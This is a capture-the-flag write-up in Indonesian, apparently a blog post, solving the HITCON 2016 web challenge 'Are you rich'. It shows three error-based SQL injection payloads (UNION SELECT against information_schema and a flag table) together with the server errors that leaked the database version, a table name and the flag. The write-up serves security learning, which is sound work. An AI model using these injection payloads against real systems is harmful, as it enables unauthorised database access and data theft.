---
layout: post
title: "Hitcon 2016 : Are you rich"
description: "Hitcon 2016 : Are you rich"
headline: 
modified: 2016-10-10
category: Hitcon 2016
tags: [Hitcon 2016]
imagefeature: /images/php.jpg
mathjax: 
chart: 
comments: true
featured: true
---

### Problem :

Are you rich? Buy the flag!
http://52.197.184.164/are_you_rich/

ps. You should NOT pay anything for this challenge

Some error messages which is non-related to challenge have been removed


### Solution : 

Kita dapat web di mana kita bisa lakukan generate bitcion address dan membeli flag. 
Untuk membeli flag kita harus mempunyai 5 BTC dalah address tersebut (Seharusnya),
Dan jika kita menggunakan Address BTC(>=26 karakter) yang bukan di generate dari web tersebut
maka akan muncul error `This address not issued by us` dan ketika kita menambah kan kutip 
pada address BTC nya maka akan muncul `Error when searching in the issue log`.

Dari situ kita asumsikan bahwa address BTC yang sudah di generate itu di simpan ke database
dan kemudian di cari lagi ketika kita akan membeli flag. 

Ternyata memang SQL injection 

Input : `1uQfX9XbdGu2Qr26cB1PZP4Pp8xZaRMfz' UNION SELECT (select @@version) limit 1,2#`
Error : `Error!: Remote API server reject your invalid address '5.7.15-0ubuntu0.16.04.1'. If your address is valid, please PM @cebrusfs or other admin on IRC.`

Input : `1uQfX9XbdGu2Qr26cB1PZP4Pp8xZaRMfz' UNION SELECT (select table_name from information_schema.tables where table_schema != 'information_schema' limit 1) limit 1,2#`
Error : `Error!: Remote API server reject your invalid address 'flag1'. If your address is valid, please PM @cebrusfs or other admin on IRC.`

Input : `1uQfX9XbdGu2Qr26cB1PZP4Pp8xZaRMfz' UNION SELECT (select flag from flag1 limit 1) limit 1,2#`
Error : `Error!: Remote API server reject your invalid address 'hitcon{4r3_y0u_r1ch?ju57_buy_7h3_fl4g!!}'. If your address is valid, please PM @cebrusfs or other admin on IRC.`

Dan di dapatkan flag nya `hitcon{4r3_y0u_r1ch?ju57_buy_7h3_fl4g!!}` , sayangnya kita tidak temukan flag Are you rich 2 :(

